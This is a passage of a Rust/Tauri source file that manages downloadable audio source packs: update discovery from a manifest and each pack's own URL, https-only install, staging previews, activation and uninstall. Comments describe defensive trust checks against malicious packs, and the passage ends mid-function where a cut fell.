    T: Deserialize<'de> + Default,
{
    Ok(Option::<T>::deserialize(deserializer)?.unwrap_or_default())
}

/// 公开 manifest 里 `published` 恒为 null（管理端专用字段），服务端只下发
/// `is_published=1` 的记录，因此 null/缺失 = 已发布，仅显式 false 视为未发布。
fn null_as_published<'de, D>(deserializer: D) -> Result<bool, D::Error>
where
    D: serde::Deserializer<'de>,
{
    Ok(Option::<bool>::deserialize(deserializer)?.unwrap_or(true))
}

fn published_default() -> bool {
    true
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct SourceArtifact {
    pub path: String,
    #[allow(dead_code)]
    pub version: i64,
    pub url: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct SourceRelease {
    pub source_version_code: i64,
    pub source_version_name: String,
    #[serde(default, deserialize_with = "null_as_default")]
    pub platforms: Vec<i64>,
    #[serde(default, deserialize_with = "null_as_default")]
    pub host_api_version: i64,
    #[serde(default, deserialize_with = "null_as_default")]
    pub channel: String,
    #[serde(default, deserialize_with = "null_as_default")]
    pub notes: String,
    #[serde(default, deserialize_with = "null_as_default")]
    pub artifacts: Vec<SourceArtifact>,
    #[serde(default = "published_default", deserialize_with = "null_as_published")]
    pub published: bool,
    #[serde(default, deserialize_with = "null_as_default")]
    pub bad: bool,
    /// 服务端回滚水位（>0 = 该版本已被回滚，不下发安装）
    #[serde(default, deserialize_with = "null_as_default")]
    pub rollback_to: i64,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
struct SourceManifest {
    #[allow(dead_code)]
    schema: i64,
    release: Option<SourceRelease>,
}

/// QtRestResp 包装层（轻听后端统一响应：{code, msg, data}）。
#[derive(Debug, Clone)]
pub struct QtRestRespEnvelope<T> {
    pub code: i64,
    pub data: Option<T>,
}

impl<'de, T: Deserialize<'de>> Deserialize<'de> for QtRestRespEnvelope<T> {
    fn deserialize<D>(deserializer: D) -> Result<Self, D::Error>
    where
        D: serde::Deserializer<'de>,
    {
        use serde::de::Error as _;
        let raw = serde_json::Value::deserialize(deserializer)?;
        let code = raw
            .get("code")
            .and_then(|v| v.as_i64())
            .ok_or_else(|| D::Error::missing_field("code"))?;
        let data = match raw.get("data") {
            None | Some(Value::Null) => None,
            Some(v) => Some(T::deserialize(v.clone()).map_err(D::Error::custom)?),
        };
        Ok(QtRestRespEnvelope { code, data })
    }
}

// ---------- 网络助手 ----------

/// 受信 GET（net_guard 挡内网/非受信协议；音源包脚本只允许 https/自有 CDN）。
/// `range` 给定则带 Range 头并接受 206/200，否则只接受 200。
async fn trusted_get(
    url: &str,
    timeout_ms: u64,
    range: Option<usize>,
) -> Result<(i64, String), String> {
    let checked = crate::net_guard::ensure_trusted_download_url(url)?;
    let headers = range.map(|len| {
        HashMap::from([(
            "Range".to_string(),
            format!("bytes=0-{}", len.saturating_sub(1)),
        )])
    });
    let res = source_builtin_request(
        checked.as_str(),
        Some(&SourceRequestOptions {
            method: Some("GET".to_string()),
            headers,
            body: None,
            timeout_ms: Some(timeout_ms),
        }),
    )
    .await?;
    if res.status_code != 200 && !(range.is_some() && res.status_code == 206) {
        return Err(format!("HTTP {}", res.status_code));
    }
    let text = match res.body {
        Value::String(s) => s,
        other => serde_json::to_string(&other).map_err(|e| e.to_string())?,
    };
    Ok((res.status_code as i64, text))
}

/// 单文件下载（bytes）→ 文本
async fn download_pack_text(url: &str) -> Result<String, String> {
    let (_, text) = trusted_get(url, DOWNLOAD_TIMEOUT_MS, None).await?;
    if text.len() < MIN_PACK_BYTES {
        return Err("下载内容太小，不是有效的音源包".to_string());
    }
    Ok(text)
}

/// 探测远端包首行包头（Range GET 首 4KiB；解析失败/无包头 → None）
async fn probe_pack_header(url: &str) -> Result<Option<PackHeader>, String> {
    let (_, text) = trusted_get(url, PROBE_TIMEOUT_MS, Some(PROBE_RANGE_BYTES)).await?;
    let first_line = text.split('\n').next().unwrap_or("");
    Ok(parse_pack_header(first_line))
}

// ---------- 更新发现 ----------

/// 更新 offer（发现双通道归一后的统一形状；前端逐条确认后 apply）
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct PackUpdateOffer {
    /// `meta` / `play`
    pub kind: String,
    /// 目标包 id
    pub target_id: String,
    pub current_code: i64,
    pub new_code: i64,
    pub new_name: String,
    pub notes: String,
    /// `self`（包自身 updateUrl）/ `manifest`（astral）
    pub channel: String,
    pub url: String,
}

impl PackUpdateOffer {
    fn same_target(&self, other: &Self) -> bool {
        self.kind == other.kind && self.target_id == other.target_id
    }
}

/// 拉取 manifest（免认证；登录态附 satoken；platform/appVersionCode/hostApiVersion
/// 由服务端做准入预筛）。无发布 / 业务失败 → None。
async fn fetch_manifest(astral: &astral::AstralClient) -> Result<Option<SourceRelease>, String> {
    let url = format!(
        "{}/app/source/manifest?platform=1103&appVersionCode={}&hostApiVersion={}",
        astral.base_url().trim_end_matches('/'),
        astral::version_code(),
        HOST_API_VERSION,
    );
    let options = SourceRequestOptions {
        method: None,
        headers: astral
            .token()
            .map(|t| HashMap::from([("satoken".to_string(), t)])),
        body: None,
        timeout_ms: None,
    };
    let res = source_builtin_request(&url, Some(&options)).await?;
    if res.status_code == 304 {
        return Ok(None);
    }
    if res.status_code != 200 {
        return Err(format!("manifest 拉取失败: HTTP {}", res.status_code));
    }
    let text = match res.body {
        Value::String(s) => s,
        other => serde_json::to_string(&other).map_err(|e| e.to_string())?,
    };
    if text.trim().is_empty() {
        return Ok(None);
    }
    let wrapped: QtRestRespEnvelope<SourceManifest> =
        serde_json::from_str(&text).map_err(|e| format!("manifest 解析失败: {e}"))?;
    if wrapped.code != 200 && wrapped.code != 0 {
        return Ok(None);
    }
    Ok(wrapped.data.and_then(|m| m.release))
}

/// manifest 发布门槛：已发布 && 未撤回 && 未被服务端回滚 && 面向本平台 &&
/// 宿主契约不超本机（与 uniappx 同口径；hostApiVersion 超限的版本交给应用升级通道）
fn release_available(release: &SourceRelease) -> bool {
    release.published
        && !release.bad
        && release.rollback_to <= 0
        && (release.platforms.is_empty() || release.platforms.contains(&1103))
        && release.host_api_version <= HOST_API_VERSION
}

/// 更新发现（双通道归一，**只提示不安装**）：
/// ① 每个已装包自身 updateUrl 的 Range 包头探测（4h/包 节流，force 可越过）；
/// ② astral manifest（play 产物版本 = release 版本；meta 产物需包头探测）。
/// 两种包均仅对已装包提示更新——未装不下发首装 offer（安装动作完全由
/// 用户在设置页发起，客户端不宣传官方渠道）。
/// 同 targetId 多通道取 newCode 最高；meta 通道排在前面（先更数据包）。
async fn discover_updates(
    app: &AppHandle,
    astral: &astral::AstralClient,
    force: bool,
) -> Result<Value, String> {
    let dir = source_bundle::bundle_dir(app);
    let mut state = load_state(&dir);
    let now = unix_now();
    let mut offers: Vec<PackUpdateOffer> = Vec::new();

    // ① 包自身 updateUrl 探测（节流：lastProbeAt 起 4h 内不重复打）
    let mut probes = 0u32;
    for pack in state.packs.clone() {
        if pack.update_url.trim().is_empty() {
            continue;
        }
        if !force && now - pack.last_probe_at < PROBE_INTERVAL_SECS {
            continue;
        }
        probes += 1;
        if let Some(p) = state.packs.iter_mut().find(|p| p.id == pack.id) {
            p.last_probe_at = now;
        }
        match probe_pack_header(pack.update_url.trim()).await {
            Ok(Some(header))
                if header.id == pack.id
                    && header.kind == pack.kind
                    && header.version_code > pack.version_code
                    && !pack.skip_codes.contains(&header.version_code) =>
            {
                offers.push(PackUpdateOffer {
                    kind: pack.kind.clone(),
                    target_id: pack.id.clone(),
                    current_code: pack.version_code,
                    new_code: header.version_code,
                    new_name: if header.version_name.is_empty() {
                        format!("code {}", header.version_code)
                    } else {
                        header.version_name
                    },
                    notes: header.notes,
                    channel: "self".to_string(),
                    url: pack.update_url.trim().to_string(),
                });
            }
            Ok(_) => {}
            Err(e) => {
                log::info!("[source-bundle] {} 探测失败: {e}", pack.id);
            }
        }
    }
    state.last_check_at = now;

    // ② astral manifest（官方包通道：play-official / meta-official）
    match fetch_manifest(astral).await {
        Ok(Some(release)) if release_available(&release) => {
            // 播放包产物：release 版本即包版本。仅对已装的 play-official
            // 提示更新（未装不下发首装 offer——安装动作完全由用户发起）
            if let (Some(art), Some(installed)) = (
                release.artifacts.iter().find(|a| a.path == ARTIFACT_PLAY),
                state.pack(OFFICIAL_PLAY_ID),
            ) {
                let skip = installed.skip_codes.contains(&release.source_version_code);
                // 版本压制例外：本地官方包从未通过签名校验（签名落地前的历史
                // 冒充包）——manifest 真官方更新不按 versionCode 压制，总能提示
                // 出来覆盖掉它。
                let unverified_official = !installed.sign_verified;
                if (release.source_version_code > installed.version_code || unverified_official)
                    && !skip
                {
                    offers.push(PackUpdateOffer {
                        kind: PACK_KIND_PLAY.to_string(),
                        target_id: OFFICIAL_PLAY_ID.to_string(),
                        current_code: installed.version_code,
                        new_code: release.source_version_code,
                        new_name: release.source_version_name.clone(),
                        notes: release.notes.clone(),
                        channel: "manifest".to_string(),
                        url: art.url.clone(),
                    });
                }
            }
            // 数据包产物：manifest 只有产物清单，版本要探测包头才知道。
            // 仅对已装的 meta-official 提示更新——未装不下发首装 offer
            // （首页引导只指路设置页，安装动作完全由用户发起）
            if let (Some(art), Some(installed)) = (
                release.artifacts.iter().find(|a| a.path == ARTIFACT_META),
                state.pack(OFFICIAL_META_ID),
            ) {
                if let Ok(Some(header)) = probe_pack_header(&art.url).await {
                    // 版本压制例外：同 play 通道（历史未验签官方包不压制）
                    let unverified_official = !installed.sign_verified;
                    if header.kind == PACK_KIND_META
                        && header.id == OFFICIAL_META_ID
                        && (header.version_code > installed.version_code || unverified_official)
                        && !installed.skip_codes.contains(&header.version_code)
                    {
                        offers.push(PackUpdateOffer {
                            kind: PACK_KIND_META.to_string(),
                            target_id: OFFICIAL_META_ID.to_string(),
                            current_code: installed.version_code,
                            new_code: header.version_code,
                            new_name: if header.version_name.is_empty() {
                                format!("code {}", header.version_code)
                            } else {
                                header.version_name
                            },
                            notes: release.notes.clone(),
                            channel: "manifest".to_string(),
                            url: art.url.clone(),
                        });
                    }
                }
            }
        }
        Ok(_) => {}
        Err(e) => log::info!("[source-bundle] manifest 通道不可用: {e}"),
    }

    // 去重（同 target 取 newCode 最高）+ meta 优先
    offers.sort_by(|a, b| {
        let kind = |o: &PackUpdateOffer| if o.kind == PACK_KIND_META { 0 } else { 1 };
        kind(a).cmp(&kind(b)).then(b.new_code.cmp(&a.new_code))
    });
    let mut merged: Vec<PackUpdateOffer> = Vec::new();
    for offer in offers {
        if let Some(existing) = merged.iter_mut().find(|o| o.same_target(&offer)) {
            if offer.new_code > existing.new_code {
                *existing = offer;
            }
        } else {
            merged.push(offer);
        }
    }
    // 重新按 meta 优先排（去重可能换了元素）
    merged.sort_by_key(|o| if o.kind == PACK_KIND_META { 0 } else { 1 });

    save_state(&dir, &state)?;
    log::info!(
        "[source-bundle] 更新发现完成：{} 个 offer（{} 次自探测，manifest 已查）",
        merged.len(),
        probes
    );
    Ok(json!({ "offers": merged }))
}

// ---------- 命令 ----------

/// 当前音源包状态（引擎页与设置页共用；v3 统一包模型）
#[tauri::command(rename = "source_state")]
pub async fn cmd_source_state(app: AppHandle) -> Result<Value, String> {
    let dir = source_bundle::bundle_dir(&app);
    let state = load_state(&dir);
    serde_json::to_value(&state).map_err(|e| e.to_string())
}

/// 更新发现（设置页「检查更新」force=true；启动静默检查 force=false）
#[tauri::command(rename = "source_discover_updates")]
pub async fn cmd_source_discover_updates(
    app: AppHandle,
    state: tauri::State<'_, AppState>,
    force: Option<bool>,
) -> Result<Value, String> {
    discover_updates(&app, &state.astral, force.unwrap_or(false)).await
}

/// 应用一个更新 offer（用户在启动提示/设置页逐条确认后调用）：
/// 下载 → 包头必须与 offer 的 id/kind/versionCode 完全一致 → 按更新安装。
/// 同步失败（下载/校验/落盘）自动还原 .prev 并拉黑该版本；
/// 引擎侧装载/冒烟失败由 load_failed 异步回滚（同一现场）。
/// 任何失败都会把摘要记到包记录的 last_error（列表观测「上次失败」）。
#[tauri::command(rename = "source_apply_update")]
pub async fn cmd_source_apply_update(
    app: AppHandle,
    offer: PackUpdateOffer,
) -> Result<Value, String> {
    if offer.kind != PACK_KIND_META && offer.kind != PACK_KIND_PLAY {
        return Err("更新信息无效：未知包类型".to_string());
    }
    if !valid_pack_id(&offer.target_id) {
        return Err("更新信息无效：包 id 非法".to_string());
    }
    let dir = source_bundle::bundle_dir(&app);
    // 下载 + 包头与 offer 一致性校验（不通过 = 更新失败，同样要记账）
    let text = match download_update_text(&offer).await {
        Ok(text) => text,
        Err(e) => {
            note_pack_error_at(&dir, &offer.target_id, &e);
            return Err(e);
        }
    };
    let old_version = load_state(&dir)
        .pack(&offer.target_id)
        .map(|p| p.version_code);
    // 官方 manifest 通道更新 → 安装来源改写为 manifest；自管通道（包自身
    // updateUrl）保留原安装来源（install_pack_at 内处理）
    let channel = if offer.channel == "manifest" {
        INSTALL_SOURCE_MANIFEST
    } else {
        ""
    };
    let outcome = install_pack_at(&dir, &text, true, channel, "");
    match outcome {
        Ok(outcome) => {
            broadcast_if_activated(&app, &outcome);
            log::info!(
                "[source-bundle] 更新应用成功：{} v{}（通道 {}）",
                offer.target_id,
                offer.new_code,
                offer.channel
            );
            Ok(serde_json::to_value(&outcome).map_err(|e| e.to_string())?)
        }
        Err(e) => {
            // 同步失败现场已还原（install_pack_at 内部负责 .prev）；
            // 与 uniappx 同口径：回滚发生即拉黑该版本
            if old_version.is_some() {
                mark_pack_bad_at(&dir, &offer.target_id, offer.new_code);
                note_pack_error_at(&dir, &offer.target_id, &e);
                let prev = old_version.map(|v| v.to_string()).unwrap_or_default();
                return Err(format!(
                    "更新失败：{e}（已回滚到 v{prev}，v{} 已列入跳过）",
                    offer.new_code
                ));
            }
            Err(format!("安装失败：{e}"))
        }
    }
}

/// 下载更新产物并校验包头与 offer 完全一致（applyUpdate 专用）
async fn download_update_text(offer: &PackUpdateOffer) -> Result<String, String> {
    let text = download_pack_text(offer.url.trim()).await?;
    let header = parse_pack_header(&text)
        .ok_or_else(|| "远端文件不是音源包（首行缺少 __QT_PACK__ 包头）".to_string())?;
    if header.id != offer.target_id
        || header.kind != offer.kind
        || header.version_code != offer.new_code
    {
        return Err(format!(
            "远端文件与更新信息不一致（{}/{}/v{}），已取消",
            header.id, header.kind, header.version_code
        ));
    }
    Ok(text)
}

/// 拉黑某包的一个版本号（装载/冒烟失败后不再自动更新到该版本）
fn mark_pack_bad_at(dir: &Path, pack_id: &str, code: i64) {
    if code <= 0 {
        return;
    }
    let mut state = load_state(dir);
    if let Some(p) = state.packs.iter_mut().find(|p| p.id == pack_id) {
        if !p.skip_codes.contains(&code) {
            p.skip_codes.push(code);
            let _ = save_state(dir, &state);
        }
    }
}

/// 从 https 直链安装（用户粘贴 play-bundle.js / meta-bundle.js 直链）
#[tauri::command(rename = "source_install_from_url")]
pub async fn cmd_source_install_from_url(app: AppHandle, url: String) -> Result<Value, String> {
    let url = url.trim().to_string();
    if url.is_empty() {
        return Err("链接不能为空".to_string());
    }
    if !url.starts_with("https://") {
        return Err("只支持 https:// 直链".to_string());
    }
    let text = download_pack_text(&url).await?;
    let dir = source_bundle::bundle_dir(&app);
    let outcome = install_pack_at(&dir, &text, false, INSTALL_SOURCE_URL, &url)?;
    broadcast_if_activated(&app, &outcome);
    log::info!(
        "[source-bundle] 直链安装 {} {} v{}",
        outcome.kind,
        outcome.pack.id,
        outcome.pack.version_code
    );
    Ok(serde_json::to_value(&outcome).map_err(|e| e.to_string())?)
}

/// 从包文本安装（诊断/导入用；与直链同一条管线，来源记为未知）
#[tauri::command(rename = "source_install_from_text")]
pub async fn cmd_source_install_from_text(app: AppHandle, text: String) -> Result<Value, String> {
    let dir = source_bundle::bundle_dir(&app);
    let outcome = install_pack_at(&dir, &text, false, "", "")?;
    broadcast_if_activated(&app, &outcome);
    Ok(serde_json::to_value(&outcome).map_err(|e| e.to_string())?)
}

/// 从本地文件安装：系统文件选择框（.js）→ 读文本 → 统一安装管线。
/// 用户取消返回 null。
#[tauri::command(rename = "source_install_local_file")]
pub async fn cmd_source_install_local_file(app: AppHandle) -> Result<Option<Value>, String> {
    use tauri_plugin_dialog::DialogExt;

    let dialog_app = app.clone();
    let picked = tauri::async_runtime::spawn_blocking(move || {
        dialog_app
            .dialog()
            .file()
            .set_title("选择音源包（.js）")
            .add_filter("音源包", &["js"])
            .blocking_pick_file()
    })
    .await
    .map_err(|e| format!("打开文件选择框失败: {e}"))?;
    let Some(picked) = picked else {
        return Ok(None);
    };
    let path = picked
        .into_path()
        .map_err(|e| format!("无效的文件路径: {e:?}"))?;
    let text = std::fs::read_to_string(&path).map_err(|e| format!("读取文件失败: {e}"))?;
    let dir = source_bundle::bundle_dir(&app);
    // 来源展示只记文件名（完整本机路径没必要进状态文件）
    let file_ref = path
        .file_name()
        .map(|n| n.to_string_lossy().to_string())
        .unwrap_or_default();
    let outcome = install_pack_at(&dir, &text, false, INSTALL_SOURCE_FILE, &file_ref)?;
    broadcast_if_activated(&app, &outcome);
    log::info!(
        "[source-bundle] 本地文件安装 {} {} v{}（{}）",
        outcome.kind,
        outcome.pack.id,
        outcome.pack.version_code,
        path.display()
    );
    Ok(Some(
        serde_json::to_value(&outcome).map_err(|e| e.to_string())?,
    ))
}

/// 安装预览 ①（直链）：下载全文 → 静态校验（官方 id 含 ed25519 签名硬校验，
/// 假包在这一步报错，到不了预览）→ 暂存，返回预览信息（signatureVerified）。
#[tauri::command(rename = "source_stage_from_url")]
pub async fn cmd_source_stage_from_url(app: AppHandle, url: String) -> Result<Value, String> {
    let url = url.trim().to_string();
    if url.is_empty() {
        return Err("链接不能为空".to_string());
    }
    if !url.starts_with("https://") {
        return Err("只支持 https:// 直链".to_string());
    }
    let text = download_pack_text(&url).await?;
    let preview = stage_pack_text(&app, &text, INSTALL_SOURCE_URL, &url)?;
    log::info!(
        "[source-bundle] 安装预览（直链）{} {} v{}",
        preview.kind,
        preview.id,
        preview.version_code
    );
    Ok(serde_json::to_value(&preview).map_err(|e| e.to_string())?)
}

/// 安装预览 ②（本地文件）：文件选择框 → 读全文 → 静态校验 → 暂存。
/// 用户取消选择返回 null（与 source_install_local_file 同口径）。
#[tauri::command(rename = "source_stage_from_file")]
pub async fn cmd_source_stage_from_file(app: AppHandle) -> Result<Option<Value>, String> {
    use tauri_plugin_dialog::DialogExt;

    let dialog_app = app.clone();
    let picked = tauri::async_runtime::spawn_blocking(move || {
        dialog_app
            .dialog()
            .file()
            .set_title("选择音源包（.js）")
            .add_filter("音源包", &["js"])
            .blocking_pick_file()
    })
    .await
    .map_err(|e| format!("打开文件选择框失败: {e}"))?;
    let Some(picked) = picked else {
        return Ok(None);
    };
    let path = picked
        .into_path()
        .map_err(|e| format!("无效的文件路径: {e:?}"))?;
    let text = std::fs::read_to_string(&path).map_err(|e| format!("读取文件失败: {e}"))?;
    let file_ref = path
        .file_name()
        .map(|n| n.to_string_lossy().to_string())
        .unwrap_or_default();
    let preview = stage_pack_text(&app, &text, INSTALL_SOURCE_FILE, &file_ref)?;
    log::info!(
        "[source-bundle] 安装预览（本地 {file_ref}）{} {} v{}",
        preview.kind,
        preview.id,
        preview.version_code
    );
    Ok(Some(
        serde_json::to_value(&preview).map_err(|e| e.to_string())?,
    ))
}

/// 安装预览 ③：用户在预览弹窗确认后按暂存 token 落盘安装
/// （manifest 通道的 applyUpdate 不走预览，用户已在更新确认里看过信息）。
#[tauri::command(rename = "source_install_staged")]
pub async fn cmd_source_install_staged(app: AppHandle, token: String) -> Result<Value, String> {
    let Some(staged) = take_staged(token.trim()) else {
        return Err("预览已过期或已安装过，请重新获取包信息".to_string());
    };
    let dir = source_bundle::bundle_dir(&app);
    let outcome = install_pack_at(
        &dir,
        &staged.text,
        false,
        &staged.channel,
        &staged.reference,
    )?;
    broadcast_if_activated(&app, &outcome);
    log::info!(
        "[source-bundle] 预览确认安装 {} {} v{}（渠道 {}）",
        outcome.kind,
        outcome.pack.id,
        outcome.pack.version_code,
        staged.channel
    );
    Ok(serde_json::to_value(&outcome).map_err(|e| e.to_string())?)
}

/// 切换生效包（设置页单选；kind 决定槽位与广播）：
/// - play → activeId + `source-pack-changed`（引擎热装载 + 冒烟）；
/// - meta → activeMetaId + `source-meta-changed`（引擎重装 meta 槽并复验契约，
///   失败会经 source_meta_load_failed 自动回滚/清槽）；
/// - packId 为空 + kind 指明槽位 → 切回空位（数据面下线：在线搜索/歌单不可
///   用，本地音乐不受影响；首页引导随之出现）。
#[tauri::command(rename = "source_activate_pack")]
pub async fn cmd_source_activate_pack(
    app: AppHandle,
    pack_id: String,
    kind: Option<String>,
) -> Result<Value, String> {
    let dir = source_bundle::bundle_dir(&app);
    let mut state = load_state(&dir);
    if pack_id.is_empty() {
        let slot_kind = kind.as_deref().unwrap_or("");
        if slot_kind == PACK_KIND_META {
            state.active_meta_id = None;
            save_state(&dir, &state)?;
            broadcast_meta_changed(&app);
            return Ok(json!({ "activated": "", "kind": PACK_KIND_META }));
        }
        if slot_kind == PACK_KIND_PLAY {
            state.active_id = None;
            save_state(&dir, &state)?;
            broadcast_packs_changed(&app);
            return Ok(json!({ "activated": "", "kind": PACK_KIND_PLAY }));
        }
        return Err("清空生效槽位必须指明包类型".to_string());
    }
    let Some(pack) = state.pack(&pack_id).cloned() else {
        return Err(format!("音源包不存在: {pack_id}"));
    };
    if pack.kind == PACK_KIND_META {
        // 手动启用数据包 = 宿主发起的一次现场（P-IPC-2）：登记 pending 后，
        // 引擎随后的装载失败上报才够得上 Full 信任（见 report_trust），从而按
        // 既有语义把数据槽清空回「未装态」。is_update=false ⇒ 该上报只会清槽，
        // 不会回滚 .prev、不会摘除包记录（手动装的包失败要留在列表里等用户处理）。
        //
        // 已经是生效包时不重复登记：引擎页 onMetaChanged 在「同 id 同 code 且
        // entries 就绪」时幂等早退、不会回 source_meta_loaded，重复登记会让这次
        // 现场永远收不了摊（滞留的现场虽因「已生效」不构成越权，但没必要留）。
        if state.active_meta_id.as_deref() != Some(pack_id.as_str()) {
            put_pending(
                &pack_id,
                PendingApply {
                    kind: pack.kind.clone(),
                    is_update: false,
                    prev_pack: None,
                    prev_active: state.active_id.clone(),
                    prev_active_meta: state.active_meta_id.clone(),
                },
            );
        }
        state.active_meta_id = Some(pack_id.clone());
    } else {
        state.active_id = Some(pack_id.clone());
    }
    save_state(&dir, &state)?;
    if pack.kind == PACK_KIND_META {
        broadcast_meta_changed(&app);
    } else {
        broadcast_packs_changed(&app);
    }
    Ok(json!({ "activated": pack_id, "kind": pack.kind }))
}

/// 卸载包（删目录 + 出列表；生效位若指向它则清空该槽——不自动顺延，
/// 由用户在设置页选择下一个）。卸载生效中的数据包后数据面下线（首页引导
/// 重新出现）；卸载生效中的播放包后在线播放不可用（设置页有提示文案）。
#[tauri::command(rename = "source_uninstall_pack")]
pub async fn cmd_source_uninstall_pack(app: AppHandle, pack_id: String) -> Result<Value, String> {
    let dir = source_bundle::bundle_dir(&app);
    let mut state = load_state(&dir);
    let Some(idx) = state.packs.iter().position(|p| p.id == pack_id) else {
        return Err(format!("音源包不存在: {pack_id}"));
    };
    let removed = state.packs.remove(idx);
    let _ = std::fs::remove_dir_all(install_dir(&dir, &removed.dir));
    let was_active = if removed.kind == PACK_KIND_META {
        let hit = state.active_meta_id.as_deref() == Some(&pack_id);
        if hit {
            state.active_meta_id = None;
        }
        hit
    } else {
        let hit = state.active_id.as_deref() == Some(&pack_id);
        if hit {
            state.active_id = None;
        }
        hit
    };
    clear_pending(&pack_id);
    save_state(&dir, &state)?;
    if removed.kind == PACK_KIND_META {
        if was_active {
            broadcast_meta_changed(&app);
        }
    } else {
        broadcast_packs_changed(&app);
    }
    log::info!("[source-bundle] 已卸载 {} {}", removed.kind, removed.id);
    Ok(json!({ "uninstalled": pack_id, "kind": removed.kind }))
}

/// 该包是否是「它自己 kind 对应的当前生效包」。
fn is_pack_active(state: &SourceBundleState, pack: &SourcePackMeta) -> bool {
    if pack.kind == PACK_KIND_META {
        state.active_meta_id.as_deref() == Some(pack.id.as_str())
    } else {
        state.active_id.as_deref() == Some(pack.id.as_str())
    }
}

/// 是否存在该包的待生效现场（安装/更新时写入，成功收摊或失败回滚时消费）。
fn has_pending(pack_id: &str) -> bool {
    pending_map()
        .lock()
        .unwrap_or_else(|e| e.into_inner())
        .contains_key(pack_id)
}

/// 引擎页上报的可信级别。
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum ReportTrust {
    /// 该包确有待生效现场：上报可被完全采信（允许回滚 `.prev`、清空生效槽位）。
    Full,
    /// 无现场，但该包正是本 kind 的当前生效包：只允许「观测性」写入
    /// （补名、记 last_error），**不得**回滚、不得清槽。
    ObserveOnly,
    /// 完全不可信：丢弃本次上报。
    None,
}

/// 判定一次引擎页上报的可信级别。
///
/// 背景（P-IPC-2）：引擎页把音源包 `import()`/`new Function` 到同一个 JS realm
/// 里求值，包脚本可以直接 `__TAURI_INTERNALS__.invoke` 调用引擎窗口白名单内的
/// 任意命令（`__TAURI_INTERNALS__` 必须暴露，否则 fetch 型 invoke 不可用），
/// 甚至可以挂钩 `invoke` 观察/顶替引擎页自己的上报。因此这些回调**不能假定
/// 调用方就是引擎页**，只能依据宿主自身状态定级。
///
/// 判定用的是两条宿主侧事实，缺一不可：
/// 1. **该包是本 kind 的当前生效包**。引擎页只对生效包上报（`describe` /
///    `verified` / `load_failed` 取 `state.activeId`，`meta_*` 取
///    `state.activeMetaId`，见 source_engine_page.html），所以「生效」是上报者
///    的必要条件。这一条同时挡住「替别的包收摊」：未启用包的现场不会被消费，
///    可以长期滞留（见 `install_pack_at` 的生效门），若只看 pending，一个已生效
///    的恶意播放包就能对那个滞留现场调 `source_pack_verified` 抹掉别人的更新
///    现场、或调 `*_load_failed` 触发误回滚/误摘除。
/// 2. **该包确有现场**（`PendingApply`）。
///
/// 两条同时成立才给 Full。此时上报只可能是「宿主刚发起的那次安装/启用」对应的
/// 装载结果：现场只由 `install_pack_at`（安装/更新）与 `cmd_source_activate_pack`
/// （手动启用数据包）建立，装载成功即被 `source_meta_loaded` /
/// `source_pack_verified` 收摊。
///
/// 生效但无现场（例如 boot 期装载失败、或现场已被成功上报消费掉）只给
/// ObserveOnly：补名、记 `last_error` 可以，回滚 `.prev` 与清空生效槽位不行。
///
/// boot **刻意不预置现场**：预置后一旦页面没走到那次上报就挂掉（`waitInternals`
/// 超时、`source_state` 取值失败导致 `metaTarget.url` 为空而提前返回、页面异常），
/// 现场会滞留整个会话，反而把伪造窗口从「一次安装/启用」放大成「整个会话」——
/// 与收紧授权相反。代价是启动时装载失败不再自动清空数据槽（只记 `last_error`、
/// 由引擎页自行下线数据面），这是有意的取舍：清槽/回滚只认宿主现场。
///
/// 残留风险（已知且有界）：现场存活期间，同一 realm 里正在运行的恶意播放包
/// 理论上可以抢先顶替引擎页发出那一次上报（挂钩 `invoke`）。这需要「另一槽位
/// 正好有一次安装/启用在进行中」这一窄窗口，且最多影响那次更新本身；同 realm
/// 执行是既有设计取舍，彻底消除需要换 realm（见 pack_safety.rs 的说明）。
fn report_trust(state: &SourceBundleState, pack_id: &str) -> ReportTrust {
    let Some(pack) = state.pack(pack_id) else {
        return ReportTrust::None;
    };
    if !is_pack_active(state, pack) {
        return ReportTrust::None;
    }
    if has_pending(pack_id) {
        return ReportTrust::Full;
    }
    ReportTrust::ObserveOnly
}

/// 引擎装配成功后回填包自述名（v3 包头已带全量元信息，仅补空缺字段）。
/// 注意：这里**不**清更新现场——describe 发生在冒烟之前，现场要留给
/// 冒烟失败回滚用（冒烟通过后由 `source_pack_verified` 收摊）。
#[tauri::command(rename = "source_pack_describe")]
pub async fn cmd_source_pack_describe(
    app: AppHandle,
    pack_id: String,
    name: Option<String>,
    #[allow(unused_variables)] version: Option<String>,
) -> Result<Value, String> {
    let dir = source_bundle::bundle_dir(&app);
    let mut state = load_state(&dir);
    // 自述名会展示在设置页：只认有现场或正生效的包，防恶意包改写他人展示名
    match report_trust(&state, &pack_id) {
        ReportTrust::Full | ReportTrust::ObserveOnly => {}
        ReportTrust::None => {
            log::warn!("[source-bundle] 拒绝包自述上报（{pack_id}：非生效包且无现场）");
            return Ok(json!({ "described": false }));
        }
    }
    let Some(pack) = state.packs.iter_mut().find(|p| p.id == pack_id) else {
        return Ok(json!({ "described": false }));
    };
    if pack.name.trim().is_empty() {
        if let Some(n) = name.filter(|v| !v.trim().is_empty()) {
            pack.name = n;
        }
    }
    save_state(&dir, &state)?;
    Ok(json!({ "described": true }))
}

/// 播放包装配 + 冒烟全链路通过（引擎页调用）：更新现场收摊 + 清失败记录。
#[tauri::command(rename = "source_pack_verified")]
pub async fn cmd_source_pack_verified(app: AppHandle, pack_id: String) -> Result<Value, String> {
    if !pack_id.is_empty() {
        let dir = source_bundle::bundle_dir(&app);
        let state = load_state(&dir);
        // 收摊（清 pending）只允许有现场的包：否则恶意包可替别人把回滚现场抹掉
        match report_trust(&state, &pack_id) {
            ReportTrust::Full | ReportTrust::ObserveOnly => {}
            ReportTrust::None => {
                log::warn!("[source-bundle] 拒绝装配通过上报（{pack_id}：非生效包且无现场）");
                return Ok(json!({ "verified": false }));
            }
        }
        clear_pending(&pack_id);
        clear_pack_error_at(&dir, &pack_id);
    }
    Ok(json!({ "verified": true }))
}

/// 引擎 meta 槽装载成功上报（引擎页调用）：清更新现场 + 清失败记录 + 记日志。
/// packId 为空串 = 防御口径（未装数据包时引擎不上报）。
#[tauri::command(rename = "source_meta_loaded")]
pub async fn cmd_source_meta_loaded(
    app: AppHandle,
    pack_id: String,
    code: Option<i64>,
) -> Result<Value, String> {
    if !pack_id.is_empty() {
